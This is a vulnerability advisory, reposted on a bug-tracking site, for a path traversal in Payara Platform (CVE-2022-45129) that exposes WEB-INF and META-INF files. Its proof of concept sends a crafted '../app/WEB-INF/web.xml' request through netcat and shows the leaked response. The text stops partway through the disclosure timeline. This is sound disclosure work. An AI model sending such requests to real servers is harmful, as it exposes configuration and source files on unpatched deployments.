---
title: Payara Platform Path Traversal
url: https://cxsecurity.com/issue/WLB-2022110022
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2022-11-16
fetch_date: 2025-10-03T22:50:50.706353
---

# Payara Platform Path Traversal

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Payara Platform Path Traversal** **2022.11.15**  Credit:  **[Michael Baer](https://cxsecurity.com/author/Michael%2BBaer/1/)**  Risk: **Medium**  Local: **No**  Remote: ****Yes****  CVE: **[CVE-2022-45129](https://cxsecurity.com/cveshow/CVE-2022-45129/ "Click to see CVE-2022-45129")** | **[CVE-2021-41381](https://cxsecurity.com/cveshow/CVE-2021-41381/ "Click to see CVE-2021-41381")**  CWE: **[CWE-22](https://cxsecurity.com/cwe/CWE-22 "Click to see CWE-22")** | |

SEC Consult Vulnerability Lab Security Advisory < 20221114-0 >
=======================================================================
title: Path Traversal Vulnerability
product: Payara Platform
vulnerable version: Enterprise: <5.45.0
Community: <6.2022.1, <5.2022.4, <4.1.2.191.38
fixed version: Enterprise: 5.45.0
Community: 6.2022.1, 5.2022.4, 4.1.2.191.38
CVE number: CVE-2022-45129
impact: High
homepage: https://www.payara.fish
found: 2022-09-29
by: Michael Baer (Office Nuremberg)
SEC Consult Vulnerability Lab
An integrated part of SEC Consult, an Atos company
Europe | Asia | North America
https://www.sec-consult.com
=======================================================================
Vendor description:
-------------------
"Payara Micro Community is the open source, lightweight middleware platform of choice
for containerized Jakarta EE application deployments. less than 70MB, Payara Micro
requires no installation, configuration, or code rewrites."
Source: https://www.payara.fish/products/payara-platform-community/
Business recommendation:
------------------------
The vendor provides an update for the affected versions which should be installed
immediately.
SEC Consult highly recommends to perform a thorough security review of the
Payara Software by security professionals to identify and resolve potential
further security issues.
Vulnerability overview/description:
-----------------------------------
1) Path Traversal Vulnerability (CVE-2022-45129)
A path traversal similar to the old CVE-2021-41381 allows, under some circumstances,
to bypass the protection of the WEB-INF/ and META-INF/ folders. It is possible to read
files inside these directories of the deployed application. They mostly
contain configuration files for the application but may also contain source code.
Proof of concept:
-----------------
1) Path Traversal Vulnerability (CVE-2022-45129)
a) (Setup)
Deploy a web application at the root context (/). For this PoC,
the following application was used: https://github.com/AKSarav/SampleWebApp
===============================================================================
java -jar ./appserver/extras/payara-micro/payara-micro-distribution/target/payara-micro.jar --port 1234 --deploy app.war --contextroot /
===============================================================================
This application uses the org.apache.catalina.servlets.DefaultServlet for serving files.
The deployment at root (/) is crucial. The webapp has the following structure:
.
├── WEB-INF
│ ├── web.xml
│ └── weblogic.xml
├── META-INF
│ └── context.xml
├── index.html
└── welcome.jsp
b) (Attack)
The attacking payload is an HTTP request with a path starting with ../<webapp-name>/
(note that it does not start with /). To issue this request, a netcat connection can
be used:
===============================================================================
$ nc localhost 1234
GET ../app/WEB-INF/web.xml HTTP/1.1
Host: abc
===============================================================================
The server's response:
===============================================================================
HTTP/1.1 200 OK
Server: Payara Micro #badassfish
Accept-Ranges: bytes
ETag: W/"688-1664529724289"
Last-Modified: Fri, 30 Sep 2022 09:22:04 GMT
Content-Type: application/xml
Content-Length: 688
X-Frame-Options: SAMEORIGIN
<?xml version="1.0" encoding="UTF-8"?>
[...]
===============================================================================
It is possible to access all files in the app's directory /app.
The issue arises because the leading ../ is not detected to
escape the context and later the code of StandardContextValve.java
only checks the beginning of the path for forbidden directories
/META-INF/ and /WEB-INF/.
===============================================================================
requestPath.toUpperCase().startsWith("/META-INF/", 0)
===============================================================================
Vulnerable / tested versions:
-----------------------------
The vulnerability has been found in version 5.2022.3 (using jdk8-openjdk 8.345.u01-1)
and was verified as well on the Payara6 branch with the latest commit during the time
of the test: e5f68cda7a72c0c15fb55b724fe5d2e1e6255510 (using jdk11-openjdk 11.0.16.1.u1-2).
In both cases, the application was self-compiled from the official GitHub repository
on an Arch Linux distribution.
According to the vendor, "This vulnerability affects ALL the distributions of the
Payara Platform (Server Full, Server Web, Micro, Embedded, Docker images)
in every edition and major version.".
The vulnerable versions are all before 6.2022.1, 4.1.2.191.38, 5.2022.4 (Community Edition)
and 5.45.0 (Enterprise Edition).
Vendor contact timeline:
------------------------
2022-10-05: Contacting vendor through security@payara.fish asking for encryption key.
Vendor agreed to proceed without encrypted channel.
2022-10-06: Sent security advisory to vendor.
2022-10-08: Vendor cannot reproduce vulnerability.
2022-10-10: Sending additional / more detailed information.
2022-10-12: Vendor confirms the vulnerability.
2022-10-17: Contacting vendor to coordinate release date.
2022-10-25: Vendor notifies that fix is applied and live in repository, we should wait
for marketing to put patch notes online.
2022-11-02: Contacting vendor to ask for list of affected and fixed versions and CVE
number and whether marketing already sent out the information. No reply.
2022-11-09: Identifying new version & patch notes are already available online.
Requesting CVE number through MITRE.
2022-11-10: Sending CVE number to vendor...